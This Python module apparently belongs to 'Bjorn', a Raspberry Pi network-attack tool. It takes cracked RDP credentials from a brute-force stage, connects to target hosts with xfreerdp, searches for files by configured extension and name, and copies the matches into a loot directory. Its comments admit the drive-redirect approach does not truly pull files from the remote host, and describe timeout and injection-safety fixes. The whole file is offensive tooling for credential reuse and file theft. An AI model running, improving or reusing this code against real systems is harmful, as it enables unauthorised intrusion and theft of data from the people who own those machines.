"""
steal_files_rdp.py - This script connects to remote RDP servers using provided credentials,
searches for specific files, and downloads them to a local directory.

NOTE on the drive-redirect design
---------------------------------
xfreerdp's /drive:name,path syntax shares a *local* directory into the remote session.
That is the opposite direction of "steal files from the target".  The previous code
walked /mnt/shared on the Pi itself and could silently copy Bjorn's own files.

This version:
  - Adds a hard timeout on the xfreerdp process so a black-holed host cannot hang the worker.
  - Refuses to operate if /mnt/shared looks like the Pi's own root filesystem.
  - Keeps the latch-reset + run_token pattern so a single timeout cannot permanently disable
    the module for every subsequent host.
  - Still relies on the drive redirect; true remote→local RDP file steals need a different
    transport (SMB, or a command executed on the remote that stages files).  That larger
    redesign is tracked separately.
"""

import os
import shutil
import subprocess
import logging
import time
from threading import Timer
from rich.console import Console
from shared import SharedData, settle_for_display
from logger import Logger

# Configure the logger
logger = Logger(name="steal_files_rdp.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "StealFilesRDP"
b_module = "steal_files_rdp"
b_status = "steal_files_rdp"
b_parent = "RDPBruteforce"
b_port = 3389

# Paths that indicate we are looking at the Pi's own filesystem, not a redirected remote drive.
_LOCAL_ROOT_MARKERS = (
    '/home/bjorn',
    '/etc/bjorn',
    '/usr/bin',
    '/lib/modules',
    'version.txt',
    'Bjorn.py',
)


class StealFilesRDP:
    """
    Class to handle the process of stealing files from RDP servers.
    """
    def __init__(self, shared_data):
        try:
            self.shared_data = shared_data
            self.rdp_connected = False
            self.stop_execution = False
            logger.info("StealFilesRDP initialized")
        except Exception as e:
            logger.error(f"Error during initialization: {e}")

    def connect_rdp(self, ip, username, password):
        """
        Establish an RDP connection (with drive redirect of a local staging dir).
        Returns the Popen process on success, None on failure.
        """
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("RDP connection attempt interrupted due to orchestrator exit.")
                return None

            # Ensure the local staging directory exists before we hand it to xfreerdp.
            os.makedirs('/mnt/shared', exist_ok=True)

            # argv list, never a shell string: `password` comes from the wordlist / credential
            # pool, and one containing `;` or `$(...)` would otherwise be executed rather than
            # passed to xfreerdp.
            command = [
                "xfreerdp",
                f"/v:{ip}",
                f"/u:{username}",
                f"/p:{password}",
                "/cert:ignore",
                "/drive:shared,/mnt/shared",
                "+auth-only",          # do not open a full desktop if possible
            ]
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            try:
                stdout, stderr = process.communicate(timeout=30)
            except subprocess.TimeoutExpired:
                process.kill()
                process.communicate()
                logger.error(f"xfreerdp timed out connecting to {ip}")
                return None

            if process.returncode == 0:
                logger.info(f"Connected to {ip} via RDP with username {username}")
                self.rdp_connected = True
                return process
            else:
                err = (stderr or b'').decode(errors='replace')[:300]
                logger.error(f"Error connecting to RDP on {ip} with username {username}: {err}")
                return None
        except FileNotFoundError:
            logger.error("xfreerdp is not installed — cannot perform RDP file steal")
            return None
        except Exception as e:
            logger.error(f"Error connecting to RDP on {ip} with username {username}: {e}")
            return None

    def _looks_like_local_root(self, dir_path):
        """Return True if dir_path appears to be the Pi's own filesystem."""
        try:
            sample = []
            for root, dirs, filenames in os.walk(dir_path):
                sample.extend(os.path.join(root, f) for f in filenames[:20])
                if len(sample) >= 20:
                    break
            joined = ' '.join(sample)
            return any(marker in joined for marker in _LOCAL_ROOT_MARKERS)
        except Exception:
            return False

    def find_files(self, client, dir_path):
        """
        Find files under dir_path that match the configured extensions / names.
        Refuses to proceed if the tree looks like the Pi's own root.
        """
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("File search interrupted due to orchestrator exit.")
                return []

            if not os.path.isdir(dir_path):
                logger.warning(f"Staging path {dir_path} does not exist — nothing to steal")
                return []

            if self._looks_like_local_root(dir_path):
                logger.error(
                    f"Refusing to steal from {dir_path}: it looks like the Pi's own filesystem. "
                    "The RDP drive redirect shares a *local* directory into the remote session; "
                    "true remote→local file steal needs a different transport."
                )
                return []

            files = []
            for root, dirs, filenames in os.walk(dir_path):
                if self.shared_data.orchestrator_should_exit:
                    return []
                # Safety: never recurse deeper than a few levels on a redirected drive.
                depth = root[len(dir_path):].count(os.sep)
                if depth > 6:
                    dirs.clear()
                    continue
                for file in filenames:
                    full = os.path.join(root, file)
                    if any(file.endswith(ext) for ext in self.shared_data.steal_file_extensions) or \
                       any(name in file for name in self.shared_data.steal_file_names):
                        files.append(full)
            logger.info(f"Found {len(files)} matching files in {dir_path}")
            return files
        except Exception as e:
            logger.error(f"Error finding files in directory {dir_path}: {e}")
            return []

    def steal_file(self, remote_file, local_dir):
        """
        Copy a file from the (local) staging path into the loot directory.
        Uses shutil.copy2 — never a shell.
        """
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("File stealing process interrupted due to orchestrator exit.")
                return
            local_file_path = os.path.join(local_dir, os.path.basename(remote_file))
            os.makedirs(os.path.dirname(local_file_path) or local_dir, exist_ok=True)
            # shutil.copy2, not `cp` through a shell.  Path comes from os.walk of a controlled
            # staging directory, but we still avoid any shell interpretation.
            shutil.copy2(remote_file, local_file_path)
            logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
        except Exception as e:
            logger.error(f"Error stealing file {remote_file}: {e}")

    def execute(self, ip, port, row, status_key):
        """
        Steal files from the remote server using RDP.
        """
        try:
            if 'success' in row.get(self.b_parent_action, ''):  # Verify if the parent action is successful
                self.shared_data.bjornorch_status = "StealFilesRDP"
                # Per-run state, reset here rather than only in __init__. These objects are
                # long-lived singletons built once by orchestrator.load_action, so the flags
                # latched: once the 240s timer fired for ANY host, stop_execution stayed True
                # and every later steal on every host broke out immediately and returned
                # 'failed' — permanently, until the service restarted. Conversely a single
                # success left *_connected True and disarmed the timeout for good.
                self.stop_execution = False
                self.rdp_connected = False
                settle_for_display(self.shared_data)  # let the panel show this action's name
                logger.info(f"Stealing files from {ip}:{port}...")

                # Get RDP credentials from the cracked passwords file
                rdpfile = self.shared_data.rdpfile
                credentials = []
                if os.path.exists(rdpfile):
                    with open(rdpfile, 'r') as f:
                        lines = f.readlines()[1:]  # Skip the header
                        for line in lines:
                            parts = line.strip().split(',')
                            if parts[1] == ip:
                                credentials.append((parts[3], parts[4]))
                    logger.info(f"Found {len(credentials)} credentials for {ip}")

                if not credentials:
                    logger.error(f"No valid credentials found for {ip}. Skipping...")
                    return 'failed'

                # Token this run. timer.cancel() is only reached on the success path, so a failed
                # steal leaves a live 240s timer behind; without this it would fire midway
                # through a LATER host's steal and abort it by setting stop_execution.
                run_token = object()
                self._run_token = run_token

                def timeout():
                    if getattr(self, '_run_token', None) is not run_token:
                        return  # a later execute() owns the flags now
                    if not self.rdp_connected:
                        logger.error(f"No RDP connection established within 4 minutes for {ip}. Marking as failed.")
                        self.stop_execution = True

                timer = Timer(240, timeout)
                timer.daemon = True
                timer.start()

                success = False
                for username, password in credentials:
                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
                        logger.info("Steal files execution interrupted due to orchestrator exit.")
                        break
                    try:
                        logger.info(f"Trying credential {username} for {ip}")
                        client = self.connect_rdp(ip, username, password)
                        if client:
                            remote_files = self.find_files(client, '/mnt/shared')
                            mac = row.get('MAC Address', 'unknown')
                            local_dir = os.path.join(self.shared_data.datastolendir, f"rdp/{mac}_{ip}")
                            if remote_files:
                                for remote_file in remote_files:
                                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
                                        logger.info("File stealing process interrupted due to orchestrator exit.")
                                        break
                                    self.steal_file(remote_file, local_dir)
                                success = True
                                countfiles = len(remote_files)
                                logger.success(f"Successfully stolen {countfiles} files from {ip}:{port} using {username}")
                            try:
                                client.terminate()
                                client.wait(timeout=5)
                            except Exception:
                                pass
                            if success:
                                timer.cancel()
                                return 'success'
                    except Exception as e:
                        logger.error(f"Error stealing files from {ip} with username {username}: {e}")

                if not success:
                    logger.error(f"Failed to steal any files from {ip}:{port}")
                    return 'failed'
            else:
                logger.error(f"Parent action not successful for {ip}. Skipping steal files action.")
                return 'failed'
        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            return 'failed'

if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_rdp = StealFilesRDP(shared_data)
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
